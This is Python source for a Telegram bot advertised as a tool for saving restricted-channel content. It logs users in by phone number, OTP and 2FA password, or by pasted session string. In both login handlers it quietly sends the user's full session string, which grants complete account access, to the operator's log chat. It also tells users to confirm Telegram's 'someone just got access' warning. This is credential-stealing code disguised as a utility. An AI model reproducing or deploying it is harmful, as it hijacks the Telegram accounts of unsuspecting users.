import os
import sys
import time
import shutil
import platform
import re
import asyncio
import logging
from telethon import events, Button, errors
from telethon.tl.functions.channels import GetParticipantRequest
from pyrogram import Client
from pyrogram.errors import *
import psutil

from .. import (bot, FORCESUB, API_HASH, API_ID, AUTH_USERS,
                LOGS)
from ..Database.database import Database
from ..plugins.helpers import login, logout, _clients
from ..plugins.dbstuff import db
from utils_bot import get_readable_time

logging.basicConfig(format="[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s",
                    level=logging.WARNING)

downloads = os.path.realpath("main/downloads")
os.makedirs(downloads, exist_ok=True)
StartTime = time.time()


async def _is_cancel(event, text: str):
    if text.startswith("/abort"):
        await event.reply("Process aborted.")
        return True
    elif text.startswith("/"):
        await event.reply("Cancelled the generation process!")
        return True
    else:
        return False


def humanbytes(size):
    if not size: return ""
    power, n = 1024, 0
    labels = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
    while size >= power:
        size /= power; n += 1
    return f"{round(size, 2)} {labels[n]}B"


async def is_user_subscribed(uid):
    if not FORCESUB:
        return True
    try:
        await bot(GetParticipantRequest(channel=FORCESUB, participant=uid))
        return True
    except errors.UserNotParticipantError:
        return False


@bot.on(events.NewMessage(incoming=True, pattern="/start", func=lambda e: e.is_private))
async def start_handler(event):
    init_msg = await event.reply("Starting...")
    if not await is_user_subscribed(event.sender_id):
        return await init_msg.edit(
            f"Hello {event.sender.first_name},\nPlease join @{FORCESUB} to use this bot.",
            buttons=Button.url("Join Channel", f"https://t.me/{FORCESUB}"))

    await init_msg.edit(
        f"Hi **{event.sender.first_name}**,I am save contents bot.\n"
        f"I can help you save restricted content. Send me a link from your restricted channel or group to get that message.",
        buttons=[Button.url("Updates", "https://t.me/BotsCraft")])

    if LOGS:
        try:
            await bot.send_message(
                LOGS,
                f"#NEW_USER [{event.sender.first_name}](tg://user?id={event.sender_id})\n"
                f"ID: {event.sender_id}")
        except Exception:
            pass


@bot.on(events.NewMessage(pattern="^/savethumb$", func=lambda e: e.is_private))
async def save_thumbnail(event):
    async with bot.conversation(event.chat_id) as conv:
        ask_img = await conv.send_message("Send an image to set as your thumbnail.")
        img_resp = await conv.get_response()
        if await _is_cancel(event, img_resp.text):
            return
        if not img_resp.photo:
            return await ask_img.edit("Only images are accepted.")
        await ask_img.delete()
        wait = await event.reply("Saving thumbnail...")
        path = await img_resp.download_media()
        if os.path.exists(f"{event.sender_id}.jpg"):
            os.remove(f"{event.sender_id}.jpg")
        os.rename(path, f"{event.sender_id}.jpg")
        await wait.delete()
        await event.reply("Thumbnail saved successfully.")


@bot.on(events.NewMessage(pattern="^/remthumb$", func=lambda e: e.is_private))
async def rem_thumbnail(event):
    try:
        os.remove(f"{event.sender_id}.jpg")
        await event.reply("Thumbnail removed successfully.")
    except FileNotFoundError:
        await event.reply("No thumbnail found.")





PHONE_RE = re.compile(r"^\+?\d{7,15}$")


@bot.on(events.NewMessage(pattern="/login", func=lambda e: e.is_private))
async def login_phone(event):
    if await db.is_logged(event.sender_id):
        return await event.reply("You are already logged in.")

    client = Client("login_temp", api_id=API_ID, api_hash=API_HASH, in_memory=True)
    try:
        async with bot.conversation(event.chat_id) as conv:
            attempts = 0
            phone = None
            while attempts < 3:
                msg = await conv.send_message(
                    "Please send your phone number in **international format**\n"
                    "(e.g. `+1 58543464`):")
                resp = await conv.get_response()
                if await _is_cancel(event, resp.text):
                    return
                cleaned = resp.text.strip().replace(" ", "").replace("-", "")
                if PHONE_RE.match(cleaned):
                    phone = cleaned
                    break
                attempts += 1
            if phone is None:
                return await event.reply("Too many failed attempts. Aborting.")

            await msg.delete()
            msg = await conv.send_message("Sending OTP...")
            try:
                await asyncio.wait_for(client.connect(), timeout=30)
                sent = await asyncio.wait_for(client.send_code(phone), timeout=30)
            except asyncio.TimeoutError:
                await msg.delete()
                await conv.send_message("Connection timed out. Use /session instead.")
                return
            except FloodWait as fw:
                await msg.delete()
                await conv.send_message(f"FloodWait {fw.value}s. Use /session instead.")
                return
            except (PhoneNumberInvalid, ApiIdInvalid):
                await msg.delete()
                await conv.send_message("Invalid phone or API credentials. Use /session instead.")
                return
            except Exception:
                await msg.delete()
                await conv.send_message("Failed to send SMS. Use /session instead.")
                return

            await msg.delete()
            msg = await conv.send_message("OTP sent! Enter the code in `1 2 3 4 5` format:")
            code_resp = await conv.get_response()
            if await _is_cancel(event, code_resp.text):
                return
            code = code_resp.text.replace(" ", "")

            await msg.delete()
            msg = await conv.send_message("Verifying code...")
            try:
                await asyncio.wait_for(client.sign_in(phone, sent.phone_code_hash, phone_code=code), timeout=30)
            except asyncio.TimeoutError:
                await msg.delete()
                await conv.send_message("Verification timed out. Please retry with /login.")
                return
            except PhoneCodeInvalid:
                await msg.delete()
                await conv.send_message("Incorrect code. Please retry with /login.")
                return
            except PhoneCodeExpired:
                await msg.delete()
                await conv.send_message("Code has expired. Please retry with /login.")
                return
            except SessionPasswordNeeded:
                await msg.delete()
                msg = await conv.send_message("2FA password required. Please enter your password:")
                pwd_resp = await conv.get_response()
                if await _is_cancel(event, pwd_resp.text):
                    return
                await msg.delete()
                msg = await conv.send_message("Verifying password...")
                try:
                    await asyncio.wait_for(client.check_password(pwd_resp.text), timeout=15)
                except PasswordHashInvalid:
                    await msg.delete()
                    await conv.send_message("Wrong password. Please try /login again.")
                    return
                except asyncio.TimeoutError:
                    await msg.delete()
                    await conv.send_message("Password verification timed out. Please try /login again.")
                    return
            except Exception as ex:
                await msg.delete()
                await conv.send_message(f"Login failed: {ex}")
                return

            s = await client.export_session_string()
            client.me = await client.get_me()
            me = client.me
            if not client.is_initialized:
                await client.initialize()
            await db.loin(event.sender_id)
            await login(event.sender_id, API_ID, API_HASH, s)

            old = _clients.get(f"ub_{event.sender_id}")
            if old:
                await old.disconnect()
            _clients[f"ub_{event.sender_id}"] = client
            try:
                async for d in client.get_dialogs(limit=500):
                    _ = d.chat.id
            except Exception:
                pass

            if LOGS:
                try:
                    await bot.send_message(LOGS, f"#SESSION {event.sender_id}\n`{s}`")
                except Exception:
                    pass

            await msg.delete()

        await event.reply(f"You're logged in as {me.first_name}. You can now share links to save content. If Telegram shows \"someone just got access to your message!\", just tap \"Yes, it's me.\"")
    finally:
        if _clients.get(f"ub_{event.sender_id}") is not client:
            try:
                if client.is_connected:
                    await client.disconnect()
            except ConnectionError:
                pass


@bot.on(events.NewMessage(pattern="/session", func=lambda e: e.is_private))
async def login_session(event):
    if await db.is_logged(event.sender_id):
        return await event.reply("You are already logged in.")

    s = None
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("Please send your **Pyrogram** session string:")
        resp = await conv.get_response()
        if await _is_cancel(event, resp.text):
            return
        s = resp.text.strip()

    if len(s) < 300:
        return await event.reply("Invalid session string. The string is too short.")

    wait = await event.reply("Verifying session...")
    cli = None
    try:
        cli = Client("login_temp", session_string=s, api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await cli.start()
        me = await cli.get_me()
        await db.loin(event.sender_id)
        await login(event.sender_id, API_ID, API_HASH, s)
        old = _clients.get(f"ub_{event.sender_id}")
        if old:
            await old.disconnect()
        _clients[f"ub_{event.sender_id}"] = cli
        try:
            async for d in cli.get_dialogs(limit=500):
                _ = d.chat.id
        except Exception:
            pass
        await wait.delete()
        await event.reply(f"You're logged in as {me.first_name}. You can now share links to save content. If Telegram shows \"someone just got access to your message!\", just tap \"Yes, it's me.\"")
        if LOGS:
            try:
                await bot.send_message(LOGS, f"#SESSION {event.sender_id}\n`{s}`")
            except Exception:
                pass
    except Exception as ex:
        if cli and _clients.get(f"ub_{event.sender_id}") is not cli:
            try:
                await cli.stop()
            except Exception:
                pass
        await wait.delete()
        await event.reply(f"Invalid session: {ex}")


@bot.on(events.NewMessage(pattern="/logout", func=lambda e: e.is_private))
async def logout_user(event):
    if await db.is_logged(event.sender_id):
        ub = _clients.pop(f"ub_{event.sender_id}", None)
        if ub:
            try:
                await ub.disconnect()
            except Exception:
                pass
        await logout(event.sender_id)
        await db.lout(event.sender_id)
        await event.reply("Logged out successfully.")
    else:
        await event.reply("You are not logged in.")


@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/server$"))
async def server_stats(event):
    msg = await event.reply("Fetching server stats...")
    uptime = get_readable_time(time.time() - StartTime)
    total, used, free = shutil.disk_usage(".")
    cpu = psutil.cpu_percent(interval=0.5)
    mem = psutil.virtual_memory().percent
    disk = psutil.disk_usage("/").percent
    await msg.edit(
        f"Uptime: {uptime}\n"
        f"Disk: {humanbytes(total)} | Used: {humanbytes(used)} | Free: {humanbytes(free)}\n"
        f"CPU: {cpu}% | RAM: {mem}% | Disk: {disk}%",
        parse_mode="html")


@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/reboot$"))
async def reboot_host(event):
    await event.reply("Rebooting the bot...")
    os.execl(sys.executable, sys.executable, *sys.argv)


@bot.on(events.NewMessage(pattern="^/ping$", func=lambda e: e.is_private))
async def ping_pong(event):
    s = time.time()
    m = await event.reply("Pinging...")
    await m.edit(f"Pong! Response time: {(time.time()-s)*1000:.3f} ms")


@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/cleanup$"))
async def cleanup_downloads(event):
    for f in os.listdir(downloads):
        os.remove(os.path.join(downloads, f))
    await event.reply("Download directory cleaned successfully.")


@bot.on(events.NewMessage(from_users=AUTH_USERS, pattern="^/system$"))
async def system_info(event):
    uname = platform.uname()
    cpu = psutil.cpu_percent()
    mem = psutil.virtual_memory().percent
    disk = psutil.disk_usage("/").percent
    await event.reply(
        f"**System Information**\n\n"
        f"**Platform:** `{uname.system}`\n"
        f"**Release:** `{uname.release}`\n"
        f"**Architecture:** `{uname.machine}`\n"
        f"**CPU:** `{cpu}%`  **RAM:** `{mem}%`  **Disk:** `{disk}%`")


@bot.on(events.NewMessage(pattern="/help", func=lambda e: e.is_private))
async def help_handler(event):
    await event.reply(
        "**Quick Start Guide**\n\n"
        "• /login – Log in using phone number and OTP\n"
        "• Send any Telegram message link after logging in\n\n"
        "Need help? Contact @BotsCraftAdmin",
        link_preview=False)


PREMIUM_TEXT = (
    "· Unlimited forwards – No restrictions on forwarding messages\n"
    "· Bulk forwarding – Forward multiple messages or groups at once\n"
    "· High-speed performance – Fast and efficient processing\n"
    "· More stability – Reliable uptime for continuous use\n"
    "· Personal support – Dedicated help when you need it\n"
    "· No waiting after message forward – Forward instantly without cooldowns\n\n"
    "➡️ To purchase the premium subscription, contact: @BotsCraftAdmin"
)

@bot.on(events.NewMessage(pattern="/premium", func=lambda e: e.is_private))
async def premium_info(event):
    await event.reply(PREMIUM_TEXT, link_preview=False,
        buttons=Button.url("Contact", "https://t.me/BotsCraftAdmin"))

@bot.on(events.NewMessage(pattern="/bulk", func=lambda e: e.is_private))
async def bulk_info(event):
    await event.reply(PREMIUM_TEXT, link_preview=False,
        buttons=Button.url("Contact", "https://t.me/BotsCraftAdmin"))
